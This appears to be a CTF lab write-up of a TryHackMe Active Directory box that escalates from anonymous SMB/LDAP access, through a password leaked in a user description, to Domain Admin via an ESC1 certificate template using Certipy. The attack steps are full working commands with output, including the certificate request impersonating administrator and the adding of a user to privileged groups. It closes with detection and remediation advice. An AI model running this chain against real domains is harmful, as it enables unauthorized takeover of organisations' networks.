---
title: "2 Ledger — ADCS ESC1 to Domain Admin"
date: 2026-11-09
description: "A full walkthrough of the Labyrinth Active Directory box: anonymous SMB/LDAP enumeration, leaked credentials, an ESC1-vulnerable certificate template, and privilege escalation to Domain Admin with Certipy."
tags: [ctf, tryhackme, active-directory, adcs, esc1, certipy, windows]
cover: "2%20Ledger/image.png"
---

![2 Ledger](2%20Ledger/image.png)

# 2 Ledger — ADCS ESC1 to Domain Admin

A Windows Active Directory box where an anonymous SMB null session opens the door to LDAP enumeration, a password leaked in a user object gives us a foothold, and a misconfigured certificate template (ESC1) turns that foothold into Domain Admin — without ever cracking a single hash.

| | |
|---|---|
| **Platform** | TryHackMe |
| **Host** | `labyrinth.thm.local` |
| **Domain** | `thm.local` |
| **OS** | Windows Server 2019 (Build 17763) |
| **Attacker** | Kali Linux |
| **Target IP** | `10.49.166.18` (yours will differ) |
| **Key vulns** | Anonymous SMB/LDAP access, cleartext credentials in AD, ADCS ESC1 |

> **Note:** The target IP changes every time the room is deployed. Every command below uses `10.49.166.18` — substitute your own `$IP` and add `labyrinth.thm.local` to `/etc/hosts` before you start.

---

## TL;DR — Attack Path

```
Anonymous SMB null session
        │
        ▼
LDAP user enumeration as guest ──► cleartext password in user object
        │
        ▼
Valid domain credentials (IVY_WILLIS / SUSANNA_MCKNIGHT)
        │
        ▼
certipy-ad find ──► ESC1 on the "ServerAuth" template
        │
        ▼
Request certificate with UPN = administrator ──► administrator.pfx
        │
        ▼
PKINIT auth via LDAP shell ──► add IVY_WILLIS to Domain Admins
        │
        ▼
RDP as a Domain Admin ──► game over
```

---

## 1. Recon

Start with a full TCP port scan. This is a domain controller, so expect the usual AD port sprawl.

```bash
nmap -p- --min-rate 1000 -T4 10.49.166.18 -oN nmap/allports.txt
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,9389,47001 -sC -sV -Pn 10.49.166.18 -oN nmap/services.txt
```

The interesting findings:

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

A few things jump out immediately:

- **53 / 88 / 389 / 445 / 636** confirm this is a **Domain Controller**.
- The LDAP certificate reveals both the NetBIOS domain (`THM`) and the FQDN `labyrinth.thm.local`.
- `3389` gives us a place to land once we have admin rights.
- SMB signing and the LDAP channel-binding output hint at a reasonably default Server 2019 config — no obvious "easy" relay target.

Add the host to `/etc/hosts`:

```bash
echo "10.49.166.18 labyrinth.thm.local thm.local" | sudo tee -a /etc/hosts
```

---

## 2. SMB Enumeration — Null Session

Before touching LDAP, check whether SMB allows anonymous logon and share enumeration.

```bash
nxc smb 10.49.166.18 -u 'guest' -p '' --shares
```

```text
SMB  10.49.166.18  445  LABYRINTH  [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.49.166.18  445  LABYRINTH  [+] thm.local\guest:
SMB  10.49.166.18  445  LABYRINTH  [*] Enumerated shares
SMB  10.49.166.18  445  LABYRINTH  Share           Permissions     Remark
SMB  10.49.166.18  445  LABYRINTH  -----           -----------     ------
SMB  10.49.166.18  445  LABYRINTH  ADMIN$                          Remote Admin
SMB  10.49.166.18  445  LABYRINTH  C$                              Default share
SMB  10.49.166.18  445  LABYRINTH  IPC$            READ            Remote IPC
SMB  10.49.166.18  445  LABYRINTH  NETLOGON                        Logon server share
SMB  10.49.166.18  445  LABYRINTH  SYSVOL                          Logon server share
```

`Null Auth: True` and a successful `guest` logon confirm anonymous access is allowed. Share permissions for `guest` only give `READ` on `IPC$`, so there is nothing juicy to pull from SYSVOL/NETLOGON yet — but anonymous **LDAP** is a different story.

---

## 3. LDAP Enumeration and Credential Discovery

Because the domain permits anonymous binds, we can enumerate users without any credentials at all.

```bash
nxc ldap 10.49.166.18 -u 'guest' -p '' --users
```

```text
LDAP  10.49.166.18  389  LABYRINTH  [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local) (signing:None) (channel binding:Never)
LDAP  10.49.166.18  389  LABYRINTH  [+] thm.local\guest:
LDAP  10.49.166.18  389  LABYRINTH  [*] Enumerated domain users: thm.local
LDAP  10.49.166.18  389  LABYRINTH  -Username-             -Last PW Set-       -BadPW-  -Description-
LDAP  10.49.166.18  389  LABYRINTH  Guest                  <never>             0        Tier 1 User
LDAP  10.49.166.18  389  LABYRINTH  greg                   2023-05-15 20:19:03 0        Tier 1 User
LDAP  10.49.166.18  389  LABYRINTH  SHANA_FITZGERALD       2023-05-30 15:15:58 0
LDAP  10.49.166.18  389  LABYRINTH  CAREY_FIELDS           2023-05-30 15:15:58 0
...
```

![LDAP user enumeration](2%20Ledger/image%201.png)

Scrolling through the output, two user objects stand out — their **description** field contains what looks a lot like a password:

```text
IVY_WILLIS:CHANGEME2023!
SUSANNA_MCKNIGHT:CHANGEME2023!
```

A password in an AD user description is an alarmingly common real-world finding: it is readable by any authenticated (or, here, anonymous) user, and it is frequently the actual account password because admins treat the field as a notepad.

Before trusting it, validate the credentials and see whether they unlock more than `guest` did:

```bash
nxc smb 10.49.166.18 -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' --shares
```

```text
SMB  10.49.166.18  445  LABYRINTH  [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
SMB  10.49.166.18  445  LABYRINTH  [*] Enumerated shares
SMB  10.49.166.18  445  LABYRINTH  Share           Permissions     Remark
SMB  10.49.166.18  445  LABYRINTH  -----           -----------     ------
SMB  10.49.166.18  445  LABYRINTH  ADMIN$                          Remote Admin
SMB  10.49.166.18  445  LABYRINTH  C$                              Default share
SMB  10.49.166.18  445  LABYRINTH  IPC$            READ            Remote IPC
SMB  10.49.166.18  445  LABYRINTH  NETLOGON        READ            Logon server share
SMB  10.49.166.18  445  LABYRINTH  SYSVOL          READ            Logon server share
```

We now have valid domain credentials and read access to `NETLOGON` and `SYSVOL`. That is enough to authenticate to LDAP, SMB, and — most importantly — the certificate authority.

With a working account, it is worth running the standard AD checklist before going deeper:

- ~~Password spraying~~ — we already have valid creds
- ~~AS-REP roasting~~ — no need without a user list of roastable accounts
- ~~Kerberoasting~~ — no SPNs worth attacking
- ~~BloodHound~~ — less useful than ADCS here
- **ADCS enumeration** — ✅ this is the path

---

## 4. ADCS Enumeration — Finding ESC1

Active Directory Certificate Services is one of the highest-impact attack surfaces in modern AD environments. Enumerate it with Certipy:

```bash
certipy-ad find \
  -u 'IVY_WILLIS@THM.LOCAL' \
  -p 'CHANGEME2023!' \
  -dc-ip 10.49.166.18 \
  -vulnerable
```

Certipy writes a report (`<timestamp>_Certipy.txt`) and a JSON file. The CA configuration itself looks fairly standard:

```text
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Enforce Encryption for Requests     : Enabled
```

But one published template is badly broken:

```text
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
    [+] User Enrollable Principals      : THM.LOCAL\Authenticated Users
                                          THM.LOCAL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

### Why this is ESC1

Three conditions line up perfectly:

1. **`EnrolleeSuppliesSubject = True`** — the requester chooses the subject (including the UPN) in the CSR. The CA does not validate it against the authenticated user.
2. **Client Authentication EKU** — the resulting certificate can be used for Kerberos PKINIT logon.
3. **`Authenticated Users` can enroll** — any valid domain account, including our low-privileged `IVY_WILLIS`, can request a certificate.

Together, this means we can ask the CA for a certificate that says *"this is `administrator@THM.LOCAL`"* and the CA will happily issue it. That certificate can then be used to authenticate as the Domain Administrator.

---

## 5. Exploiting ESC1 — Requesting a Certificate as Administrator

Request a certificate from the `ServerAuth` template, overriding the UPN to `administrator@THM.LOCAL`:

```bash
certipy-ad req \
  -u 'IVY_WILLIS@THM.LOCAL' \
  -p 'CHANGEME2023!' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@THM.LOCAL' \
  -dc-ip 10.49.166.18 \
  -target 10.49.166.18 \
  -debug
```

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@THM.LOCAL'
[*] Saved certificate and private key to 'administrator.pfx'
```

We now hold a `.pfx` containing a certificate whose subject is the Domain Administrator. Note that this is a **certificate**, not a password — nothing was cracked, and no administrator secret was ever touched.

---

## 6. Authenticating with the Certificate (PKINIT → LDAP Shell)

Use the certificate to authenticate via Kerberos PKINIT. Certipy can drop straight into an LDAP shell with the privileges of the impersonated account:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.49.166.18 \
  -domain THM.LOCAL \
  -ldap-shell
```

```text
[*] Connecting to LDAP server...
[*] Authenticating to 10.49.166.18 as administrator@THM.LOCAL using certificate...
[*] Authenticated to 10.49.166.18 as: u:THM.LOCAL\Administrator
Type help for list of commands
#
```

The prompt confirms it: we are now operating as `THM.LOCAL\Administrator`.

---

## 7. Privilege Escalation — Adding a User to Domain Admins

Rather than working exclusively through the certificate, the cleaner move is to grant our existing, known-password account persistent Domain Admin rights. From the LDAP shell:

```text
add_user_to_group IVY_WILLIS "Domain Admins"
add_user_to_group IVY_WILLIS "Remote Desktop Users"
add_user_to_group IVY_WILLIS "Administrators"
add_user_to_group IVY_WILLIS "Enterprise Admins"
add_user_to_group IVY_WILLIS "Group Policy Creator Owners"
```

> In a real engagement you would add the **minimum** group membership required for the objective. Adding to every privileged group is noisy, damaging, and easy to detect — here it is done for convenience only.

Verify the new group membership:

```bash
nxc smb 10.49.166.18 -u 'IVY_WILLIS' -p 'CHANGEME2023!' --groups
```

At this point `IVY_WILLIS` is a Domain Admin with a password we already know, so we no longer depend on the certificate.

---

## 8. Landing on the Box with RDP

`IVY_WILLIS` is now in `Remote Desktop Users`, so connect over RDP:

```bash
xfreerdp /u:IVY_WILLIS /p:'CHANGEME2023!' /v:10.49.166.18 /cert:ignore /dynamic-resolution
```

Alternatively, use the certificate for a pass-the-certificate style logon:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.49.166.18 -domain THM.LOCAL
```

From the desktop, with Domain Admin rights, the final objectives are straightforward: read the user flag from the user's desktop and the root flag from the Administrator's desktop, and — in a real assessment — demonstrate impact by documenting the full domain compromise.

That is the box: **anonymous access → leaked credentials → ESC1 → Domain Admin**.

---

## Detection and Remediation

This chain is entirely preventable at three separate points. Fixing any one of them breaks it.

### Anonymous SMB and LDAP

- Disable null sessions and anonymous binds:
  - `RestrictAnonymous = 1` / `RestrictAnonymousSAM = 1`
  - `dsHeuristics` — set the 7th character to `2` to deny anonymous LDAP binds
  - Remove `ANONYMOUS LOGON` from `Pre-Windows 2000 Compatible Access`
- Monitor for `4624` logons of type 3 with `ANONYMOUS LOGON`, and for LDAP queries from unauthenticated binders.

### Credentials in AD attributes

- Never store passwords in `description`, `info`, `comment`, or any other world-readable attribute.
- Hunt for them: run a LDAP query for `(description=*)` and review results, and alert on `CHANGEME` / `Password` / `P@ss` patterns in directory attributes.
- Rotate any credential found in a directory attribute immediately.

### ESC1 on certificate templates

- Set **"Supply in the request"** to disabled on all templates unless there is a documented, compensating reason.
- Enable **CA certificate manager approval** for sensitive templates.
- Remove `Authenticated Users` / `Domain Users` enrollment rights from templates that allow client authentication.
- Monitor the CA for `4886` (certificate requested) and `4887` (certificate issued) events, and correlate certificate subject UPNs against the requesting account. A low-privileged user requesting a certificate for `administrator@domain` is a five-alarm fire.

### Post-exploitation

- Alert on `4728` (member added to a global group) for privileged groups, especially `Domain Admins`, `Enterprise Admins`, and `Administrators`.
- Alert on new RDP logons (`4624` type 10) from unusual accounts or hosts.

---

## Key Takeaways

1. **Anonymous access is not harmless.** A null SMB session plus an anonymous LDAP bind handed over the entire user list. Enumeration is often all an attacker needs.
2. **The `description` field is a credential store in too many environments.** One leaked password was the difference between "guest" and "domain user."
3. **A single misconfigured template equals domain compromise.** ESC1 is trivial to exploit and trivially fixed; it just requires knowing to look for it. Always run `certipy-ad find -vulnerable` on an AD assessment.
4. **Certificates are credentials.** Defenders monitor password resets but often ignore certificate issuance. That asymmetry is exactly what attackers exploit.
5. **Least privilege matters, even in a CTF.** Adding a user to five privileged groups works, but in production it is loud and destructive. Take only what the objective requires, and clean up afterwards.

---

## Tools Used

- [nmap](https://nmap.org/)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
- [Certipy](https://github.com/ly4k/Certipy)
- [xfreerdp](https://www.freerdp.com/)

